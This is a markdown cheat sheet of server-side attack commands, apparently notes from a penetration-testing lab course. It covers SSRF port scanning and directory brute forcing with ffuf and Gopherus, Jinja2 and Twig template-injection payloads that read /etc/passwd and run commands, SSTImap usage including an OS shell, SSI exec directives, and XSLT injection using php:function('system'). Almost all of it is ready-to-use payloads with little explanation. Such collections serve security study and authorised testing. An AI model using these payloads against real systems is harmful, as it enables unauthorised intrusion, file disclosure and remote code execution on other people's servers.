# Server-Side Attacks Commands Cheat Sheet

## SSRF Testing & Exploitation

### Basic SSRF Detection
```bash
# Set up netcat listener to confirm SSRF
nc -lnvp 8000
```

### Port Scanning via SSRF
```bash
# Create wordlist for port scanning
seq 1 10000 > ports.txt

# Use ffuf to scan ports through SSRF
ffuf -w ./ports.txt -u http://target/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "dateserver=http://127.0.0.1:FUZZ/&date=2024-01-01" -fr "Failed to connect to"
```

### Directory Brute Force via SSRF
```bash
ffuf -w /opt/SecLists/Discovery/Web-Content/raft-small-words.txt -u http://target/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "dateserver=http://dateserver.htb/FUZZ.php&date=2024-01-01" -fr "Server at dateserver.htb Port 80"
```

### Gopher Protocol URLs
```bash
# Generate gopher URLs with Gopherus
python2.7 gopherus.py --exploit smtp
python2.7 gopherus.py --exploit mysql
```

## SSTI Testing & Exploitation

### SSTI Detection Payload
```
${{<%[%'"}}%\.
```

### Template Engine Identification
```
${7*7}    # First test
{{7*7}}   # If first fails
{{7*'7'}} # Jinja: 7777777, Twig: 49
```

### Jinja2 Exploitation
```python
# Information disclosure
{{ config.items() }}
{{ self.__init__.__globals__.__builtins__ }}

# Local file inclusion
{{ self.__init__.__globals__.__builtins__.open("/etc/passwd").read() }}

# Remote code execution
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
```

### Twig Exploitation
```php
# Information disclosure
{{ _self }}

# Local file inclusion
{{ "/etc/passwd"|file_excerpt(1,-1) }}

# Remote code execution
{{ ['id'] | filter('system') }}
```

### SSTImap Tool Usage
```bash
# Clone and setup SSTImap
git clone https://github.com/vladko312/SSTImap
cd SSTImap
pip3 install -r requirements.txt

# Automatic detection and exploitation
python3 sstimap.py -u http://target/index.php?name=test
python3 sstimap.py -u http://target/index.php?name=test -D '/etc/passwd' './passwd'
python3 sstimap.py -u http://target/index.php?name=test -S id
python3 sstimap.py -u http://target/index.php?name=test --os-shell
```

## SSI Injection Testing

### SSI Detection Payloads
```html
<!--#printenv -->
<!--#exec cmd="whoami" -->
```

### Common SSI Directives
```html
<!--#printenv -->
<!--#config errmsg="Error!" -->
<!--#echo var="DOCUMENT_NAME" var="DATE_LOCAL" -->
<!--#exec cmd="id" -->
<!--#include virtual="index.html" -->
```

## XSLT Injection Testing

### XSLT Detection
```xml
<
```

### Information Disclosure
```xml
Version: <xsl:value-of select="system-property('xsl:version')" />
<br/>
Vendor: <xsl:value-of select="system-property('xsl:vendor')" />
<br/>
Vendor URL: <xsl:value-of select="system-property('xsl:vendor-url')" />
<br/>
Product Name: <xsl:value-of select="system-property('xsl:product-name')" />
<br/>
Product Version: <xsl:value-of select="system-property('xsl:product-version')" />
```

### Local File Inclusion (XSLT 2.0)
```xml
<xsl:value-of select="unparsed-text('/etc/passwd', 'utf-8')" />
```

### Local File Inclusion (PHP Functions Enabled)
```xml
<xsl:value-of select="php:function('file_get_contents','/etc/passwd')" />
```

### Remote Code Execution (PHP Functions Enabled)
```xml
<xsl:value-of select="php:function('system','id')" />
```

## URL Schemes for SSRF
- `http://` and `https://` - HTTP/S requests
- `file://` - Read local files (LFI)
- `gopher://` - Send arbitrary bytes

## Common Ports to Test via SSRF
- 22 (SSH)
- 25 (SMTP)
- 80 (HTTP)
- 443 (HTTPS)
- 3306 (MySQL)
- 5432 (PostgreSQL)
- 6379 (Redis)
- 8080 (Alternative HTTP)
- 9200 (Elasticsearch)
